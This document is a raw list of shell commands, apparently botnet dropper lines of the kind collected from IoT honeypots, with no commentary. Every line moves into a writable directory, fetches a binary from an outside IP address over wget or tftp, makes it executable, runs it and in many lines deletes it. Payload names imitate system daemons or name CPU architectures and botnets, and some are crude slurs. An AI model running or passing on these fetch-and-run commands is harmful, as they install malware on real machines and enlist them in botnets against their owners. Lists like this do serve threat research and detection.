cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 46.166.185.173;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 46.166.185.173;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 46.166.185.173;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 46.166.185.173;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 46.166.185.173;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 46.166.185.173;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 46.166.185.173;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 185.175.203.19;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 185.175.203.19;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 185.175.203.19;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 185.175.203.19;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 185.175.203.19;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 185.175.203.19;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 185.175.203.19;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 185.175.203.19;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 185.175.203.19;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 185.175.203.19;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '[CPU]' -g 185.175.203.19;cat '[CPU]' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 185.175.203.19;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 185.175.203.19;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/'[CPU]'; chmod +x '[CPU]'; ./'[CPU]'; rm -rf '[CPU]'
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xmips; chmod +x pl0xmips; ./pl0xmips; rm -rf pl0xmips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xmipsel; chmod +x pl0xmipsel; ./pl0xmipsel; rm -rf pl0xmipsel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xsh4; chmod +x pl0xsh4; ./pl0xsh4; rm -rf pl0xsh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xx64; chmod +x pl0xx64; ./pl0xx64; rm -rf pl0xx64
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/kittyphones; chmod +x kittyphones; ./kittyphones; rm -rf kittyphones
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xi686; chmod +x pl0xi686; ./pl0xi686; rm -rf pl0xi686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xppc; chmod +x pl0xppc; ./pl0xppc; rm -rf pl0xppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/pl0xsparc; chmod +x pl0xsparc; ./pl0xsparc; rm -rf pl0xsparc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/httpd; chmod +x httpd; ./httpd; rm -rf httpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/nantpd; chmod +x nantpd; ./nantpd; rm -rf nantpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/nasshd; chmod +x nasshd; ./nasshd; rm -rf nasshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/naopenssh; chmod +x naopenssh; ./naopenssh; rm -rf naopenssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/nabash; chmod +x nabash; ./nabash; rm -rf nabash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/natftp; chmod +x natftp; ./natftp; rm -rf natftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/nawget; chmod +x nawget; ./nawget; rm -rf nawget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/nacron; chmod +x nacron; ./nacron; rm -rf nacron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/naftp; chmod +x naftp; ./naftp; rm -rf naftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/napftp; chmod +x napftp; ./napftp; rm -rf napftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/nash; chmod +x nash; ./nash; rm -rf nash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/naapache2; chmod +x naapache2; ./naapache2; rm -rf naapache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/natelnetd; chmod +x natelnetd; ./natelnetd; rm -rf natelnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 23.226.69.115;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 23.226.69.115;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 23.226.69.115;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 23.226.69.115;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 23.226.69.115;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 23.226.69.115;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 23.226.69.115;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 23.226.69.115;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 23.226.69.115;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 23.226.69.115;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 23.226.69.115;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 23.226.69.115;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 23.226.69.115;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H1; chmod +x 4H1; ./4H1; rm -rf 4H1
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H2; chmod +x 4H2; ./4H2; rm -rf 4H2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H3; chmod +x 4H3; ./4H3; rm -rf 4H3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H4; chmod +x 4H4; ./4H4; rm -rf 4H4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H5; chmod +x 4H5; ./4H5; rm -rf 4H5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H6; chmod +x 4H6; ./4H6; rm -rf 4H6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H7; chmod +x 4H7; ./4H7; rm -rf 4H7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H8; chmod +x 4H8; ./4H8; rm -rf 4H8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H9; chmod +x 4H9; ./4H9; rm -rf 4H9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H10; chmod +x 4H10; ./4H10; rm -rf 4H10
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H11; chmod +x 4H11; ./4H11; rm -rf 4H11
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H12; chmod +x 4H12; ./4H12; rm -rf 4H12
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/cock; chmod +x cock; ./cock; rm -rf cock
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/net; chmod +x net; ./net; rm -rf net
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/botnet; chmod +x botnet; ./botnet; rm -rf botnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/swatnet; chmod +x swatnet; ./swatnet; rm -rf swatnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/dicknet; chmod +x dicknet; ./dicknet; rm -rf dicknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/fucknet; chmod +x fucknet; ./fucknet; rm -rf fucknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/cracknet; chmod +x cracknet; ./cracknet; rm -rf cracknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/weednet; chmod +x weednet; ./weednet; rm -rf weednet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/gaynet; chmod +x gaynet; ./gaynet; rm -rf gaynet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/queernet; chmod +x queernet; ./queernet; rm -rf queernet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/ballnet; chmod +x ballnet; ./ballnet; rm -rf ballnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/unet; chmod +x unet; ./unet; rm -rf unet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/yougay; chmod +x yougay; ./yougay; rm -rf yougay
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xmips; chmod +x pl0xmips; ./pl0xmips; rm -rf pl0xmips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xmipsel; chmod +x pl0xmipsel; ./pl0xmipsel; rm -rf pl0xmipsel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xsh4; chmod +x pl0xsh4; ./pl0xsh4; rm -rf pl0xsh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xx64; chmod +x pl0xx64; ./pl0xx64; rm -rf pl0xx64
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyphones; chmod +x kittyphones; ./kittyphones; rm -rf kittyphones
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xi686; chmod +x pl0xi686; ./pl0xi686; rm -rf pl0xi686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xppc; chmod +x pl0xppc; ./pl0xppc; rm -rf pl0xppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xsparc; chmod +x pl0xsparc; ./pl0xsparc; rm -rf pl0xsparc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/httpd; chmod +x httpd; ./httpd; rm -rf httpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.36/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.105.185/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 45.55.232.41;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 45.55.232.41;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 45.55.232.41;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 45.55.232.41;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 45.55.232.41;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 45.55.232.41;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 45.55.232.41;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 45.55.232.41;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 45.55.232.41;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 45.55.232.41;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 45.55.232.41;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 45.55.232.41;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 45.55.232.41;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH1 -g 185.145.129.246;cat HIH1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH2 -g 185.145.129.246;cat HIH2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH3 -g 185.145.129.246;cat HIH3 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH4 -g 185.145.129.246;cat HIH4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH5 -g 185.145.129.246;cat HIH5 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH6 -g 185.145.129.246;cat HIH6 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH7 -g 185.145.129.246;cat HIH7 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH8 -g 185.145.129.246;cat HIH8 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH9 -g 185.145.129.246;cat HIH9 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH10 -g 185.145.129.246;cat HIH10 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH11 -g 185.145.129.246;cat HIH11 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH12 -g 185.145.129.246;cat HIH12 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r HIH13 -g 185.145.129.246;cat HIH13 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.178.96.108 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.178.96.108 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.178.96.108 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.178.96.108 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.178.96.108 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
